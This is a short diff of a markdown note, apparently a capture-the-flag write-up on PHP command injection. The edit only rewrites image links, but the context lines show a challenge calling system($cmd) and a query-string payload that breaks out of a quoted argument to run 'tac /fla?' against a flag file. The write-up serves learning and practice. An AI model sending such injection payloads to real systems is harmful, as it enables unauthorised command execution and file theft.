@@ -1,4 +1,4 @@
-![[Pasted image 20230224233752.png|500]]
+![](<./img/Pasted image 20230224233752.png>)
 
 ```php
 <?php
@@ -28,6 +28,6 @@ system($cmd);
 /?comm1=index.php"; tac /fla?;"&comm2=1
 ```
 
-![[Pasted image 20230224235630.png|1000]]
+![](<./img/Pasted image 20230224235630.png>)
 
 #Web #PHP #bypass #RCE #shell
